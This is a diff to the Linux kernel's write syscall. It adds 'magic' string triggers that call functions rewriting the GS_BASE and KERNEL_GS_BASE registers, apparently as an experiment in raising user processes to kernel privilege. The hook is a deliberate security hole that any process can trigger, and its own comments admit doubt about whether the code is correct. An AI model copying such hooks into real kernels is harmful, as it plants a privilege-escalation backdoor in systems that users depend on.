@@ -638,15 +638,30 @@ ssize_t ksys_write(unsigned int fd, const char __user *buf, size_t count)
 }
 int magic_elevated = 0;
 
+unsigned long kernel_gs_base_elevate, user_gs_base_elevate;
+
+void magic_lower(void);
+void magic_lower(){
+  magic_elevated = 0;
+  printk("Doing magic lower here\n");
+  // Write it into the msr
+  wrmsrl(MSR_KERNEL_GS_BASE, user_gs_base_elevate);
+}
+
 void magic_elevate(void);
 void magic_elevate(){
   magic_elevated = 1;
 
-  printk("Doing magic here\n");
-  /* asm("pushq 0x00000000004009ae"); */
-  /* asm("retq"); */
-  /* asm("jmp 0x4009ae"); */
+  printk("Doing magic elevate here\n");
 
+  // Read current GS_BASE
+  rdmsrl(MSR_GS_BASE, kernel_gs_base_elevate);
+
+  // NOTE: this looks super wrong, but we think is right
+  rdmsrl(MSR_KERNEL_GS_BASE, user_gs_base_elevate);
+
+  // Write it into the msr
+  wrmsrl(MSR_KERNEL_GS_BASE, kernel_gs_base_elevate);
 }
 
 SYSCALL_DEFINE3(write, unsigned int, fd, const char __user *, buf,
@@ -659,6 +674,7 @@ SYSCALL_DEFINE3(write, unsigned int, fd, const char __user *, buf,
     return 7;
   }else if (count == 5 && !strcmp(buf, "lower") ){
     printk("found magic lower string\n");
+    magic_lower();
     return 5;
   }
   return ksys_write(fd, buf, count);
